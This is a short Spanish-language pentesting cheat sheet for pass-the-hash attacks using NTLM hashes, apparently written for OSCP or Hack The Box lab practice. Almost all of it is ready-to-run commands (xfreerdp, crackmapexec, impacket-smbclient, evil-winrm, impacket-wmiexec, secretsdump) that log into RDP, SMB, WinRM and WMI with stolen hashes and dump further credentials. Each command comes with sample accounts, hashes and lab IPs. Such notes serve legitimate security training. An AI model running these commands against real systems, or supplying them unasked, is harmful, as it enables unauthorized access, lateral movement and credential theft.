## DESCRIPTION

Diferentes herramienta para pasar el hash (NTLM).
Se puede conseguir con mimikatz, secretdump, de la SAM o de la NTDS.

#### Mas información
* 


## EXPLOITATION

### OPTION 1: RDP

```
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:celia.almeda /pth:e728ecbadfb02f51ce8eed753f3ff3fd /v:10.10.94.142 /d:oscp.exam
```

### OPTION 1: SMB

```
crackmapexec winrm 10.10.94.142 -u "celia.almeda" -H "e728ecbadfb02f51ce8eed753f3ff3fd" 
```

Se puede comprobar también WINRM desde aquí

```
impacket-smbclient oscp.exam/celia.almeda@10.10.94.140 -hashes ':e728ecbadfb02f51ce8eed753f3ff3fd'
```

### OPTION 1: WINRM

```
evil-winrm -i 10.10.94.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd 
```

### OPTION 1: WMI

```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.206.72 
```
### OPTION 1: SECRETDUMP

```
secretsdump.py  'EXTERNAL/Administrator@192.168.166.248' -hashes 'aad3b435b51404eeaad3b435b51404ee:56e4633688c0fdd57c610faf9d7ab8df'
```



## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 